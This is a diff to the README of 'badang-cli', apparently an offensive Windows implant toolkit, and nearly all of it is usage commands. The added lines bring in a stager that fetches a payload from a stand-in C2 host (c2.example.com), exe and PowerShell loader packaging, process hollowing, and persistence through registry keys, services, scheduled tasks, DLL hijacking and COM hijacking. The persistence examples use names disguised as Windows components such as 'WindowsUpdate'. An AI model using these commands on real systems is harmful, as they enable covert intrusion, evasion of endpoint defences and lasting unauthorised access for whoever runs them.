@@ -12,6 +12,9 @@ badang-cli generate --type exec --command "calc.exe" -o payload.bin
 badang-cli generate --type messagebox --title "Pwned" --text "Hello" -o msg.bin
 badang-cli generate --type reverse_tcp --lhost 192.168.1.10 --lport 4444 -o rev.bin
 badang-cli generate --type bind_tcp --lport 4444 -o bind.bin
+badang-cli generate --type stager --url https://c2.example.com/p.bin --stager-key s3cret -o stager.bin
+badang-cli generate --type exec --command calc.exe --package exe -o runner.rs
+badang-cli generate --type reverse_tcp --lhost 10.0.0.1 --lport 4444 --package ps1 -o loader.ps1
 ```
 
 ### Analyze
@@ -29,9 +32,10 @@ badang-cli inject --technique earlybird --payload rev.bin -x -c           # no P
 badang-cli inject --pid 1234 --technique section --payload rev.bin -x -c
 badang-cli inject --technique callback --payload rev.bin -x -c            # no PID needed
 badang-cli inject --technique stomp --payload rev.bin -x -c               # no PID needed
+badang-cli inject --technique hollowing --payload pe.exe -x -c            # no PID needed
 ```
 
-Techniques: `createremote`, `apc`, `hijack`, `earlybird`, `section`, `callback`, `stomp`
+Techniques: `createremote`, `apc`, `hijack`, `earlybird`, `section`, `callback`, `stomp`, `hollowing`
 
 ### Syscall
 ```bash
@@ -76,6 +80,17 @@ badang-cli sleep --method ekko --duration 3000 -x -c
 badang-cli spoof --demo NtAllocateVirtualMemory -x -c
 badang-cli spoof --demo NtCreateThreadEx -x -c
 ```
+
+### Persist
+```bash
+badang-cli persist --method registry --name UpdateService --payload runner.exe -x -c
+badang-cli persist --method service --name WindowsUpdate --payload svc.exe -x -c
+badang-cli persist --method schtask --name SystemCheck --payload runner.exe -x -c
+badang-cli persist --method hijack --name version.dll --target C:\App --payload ver.dll -x -c
+badang-cli persist --method com --target "{CLSID}" --payload server.dll -x -c
+```
+
+Methods: `registry`, `schtask`, `wmi`, `hijack`, `com`, `service`
 
 ### Unhook
 ```bash
@@ -127,3 +142,8 @@ badang-cli load --payload shellcode.bin
 | `--duration` | | Sleep duration in ms |
 | `--demo` | | Target function (spoof) |
 | `--filter` | | Process name filter (scan) |
+| `--url` | | Download URL (stager) |
+| `--stager-key` | | XOR key (stager) |
+| `--package` | | Output format: exe/ps1/csharp/dll |
+| `--name` | | Value/task/service name (persist) |
+| `--target` | | Target dir or CLSID (persist) |
